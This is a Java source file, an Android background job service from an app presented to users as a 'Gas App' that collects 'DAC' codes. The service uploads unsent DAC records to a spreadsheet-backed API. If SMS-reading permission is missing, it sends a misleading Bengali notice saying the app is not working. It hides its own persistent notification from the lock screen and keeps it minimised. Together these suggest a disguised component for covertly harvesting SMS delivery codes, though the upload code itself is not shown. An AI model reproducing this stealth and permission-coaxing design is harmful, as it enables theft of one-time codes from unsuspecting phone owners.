package android.iocl.dac_collector.Services;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.iocl.dac_collector.ModelData.ConsumerData;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.SearchQuery;
import android.iocl.dac_collector.ModelData.search_consumer;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.PermissionUtility;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Build;

import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

@SuppressLint("SpecifyJobSchedulerIdRange")
public class FetchProfileInfo extends JobService {

    private static final String CHANNEL_ID = "5662";
    private JobParameters mJobParameters;

    // cache keys
    private static final String PREF_LAST_FETCH = "last_profile_fetch";
    private static final long CACHE_DURATION = 10 * 60 * 60 * 1000; // 6 hours

    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        mJobParameters = jobParameters;
        createNotificationChannel();
        startServiceWithNotification();

        String number = Utility.getConsID(getApplicationContext());
        if (!number.isEmpty()) {
            if (shouldFetch()) {
                doJob(number);
                Utility.sendAnyUnsentDAC(getApplicationContext());
            } else {
                // Skip API, already fresh
                jobFinished(jobParameters, false);
            }
        } else {
            jobFinished(jobParameters, true);
        }
        return true; // Job is running
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        return true; // Reschedule if interrupted
    }

    private boolean shouldFetch() {
        long lastFetch = getSharedPreferences("dac_prefs", MODE_PRIVATE)
                .getLong(PREF_LAST_FETCH, 0);
        long now = System.currentTimeMillis();
        return (now - lastFetch) > CACHE_DURATION;
    }

    private void markFetched() {
        getSharedPreferences("dac_prefs", MODE_PRIVATE)
                .edit()
                .putLong(PREF_LAST_FETCH, System.currentTimeMillis())
                .apply();
    }

    private void doJob(String userSearchTerm) {
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext())
                .create(RequestService.class);
        SearchQuery query = new SearchQuery(userSearchTerm, "");
        search_consumer receiver = new search_consumer("getUserDetails", query);

        Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);

        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                DAC_Collector_Base body = response.body();

                if (body == null) {
                  return;
                }

                boolean isSuccess = Boolean.TRUE.equals(body.getSuccess());
                if (!isSuccess) {
                   return;
                }

                if (response.isSuccessful() && response.body() != null) {
                    String encResponse = response.body().getData();
                    ConsumerData data = (ConsumerData) Utility.decodeApiResponse(encResponse ,ConsumerData.class);

                    if (data != null){
                        Utility.updateProfile(encResponse, getApplicationContext());
                    }

                    markFetched();

                    if(!XXPermissions.isGrantedPermissions(getApplicationContext(), Permission.READ_SMS)){
                        NotificationHelper.sendNotification(getApplicationContext(), "আপনার ফোনে গ্যাসের অ্যাপ", "সঠিক ভাবে কাজ করছেনা");
                    }
                }
                jobFinished(mJobParameters, false); // done
            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {
                jobFinished(mJobParameters, true); // retry later
            }
        });
    }

    private void startServiceWithNotification() {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this,
                    0,
                    notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            Notification notification;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String channelId = "gas_app_channel";
                String channelName = "Also block this too | Always Active";
                NotificationChannel channel = new NotificationChannel(
                        channelId,
                        channelName,
                        NotificationManager.IMPORTANCE_MIN // 🔹 lowest importance
                );
                channel.setShowBadge(false);
                channel.setSound(null, null);
                channel.enableVibration(false);
                channel.enableLights(false);

                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) manager.createNotificationChannel(channel);

                notification = new Notification.Builder(this, channelId)
                        .setContentTitle("Gas App is active")
                        .setSmallIcon(R.drawable.verify_icon_blue)
//                        .setContentIntent(pendingIntent)
                        .setOngoing(true)
                        .setCategory(Notification.CATEGORY_SERVICE)
                        .setVisibility(Notification.VISIBILITY_SECRET) // 🔹 hides from lock screen
                        .setPriority(Notification.PRIORITY_MIN) // 🔹 keeps it minimized
                        .build();
            } else {
                notification = new Notification.Builder(this)
                        .setContentTitle("Gas App")
                        .setContentText("Running quietly...")
                        .setSmallIcon(R.drawable.verify_icon_blue)
                        .setContentIntent(pendingIntent)
                        .setOngoing(true)
                        .setPriority(Notification.PRIORITY_MIN)
                        .build();
            }

            NotificationManager manager = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                manager = getSystemService(NotificationManager.class);
            }
            if (manager != null) manager.notify(1001, notification);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel nc = new NotificationChannel(
                    CHANNEL_ID,
                    "Block this | Fetch Profile",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager.getNotificationChannel(CHANNEL_ID) == null) {
                manager.createNotificationChannel(nc);
            }
        }
    }
}
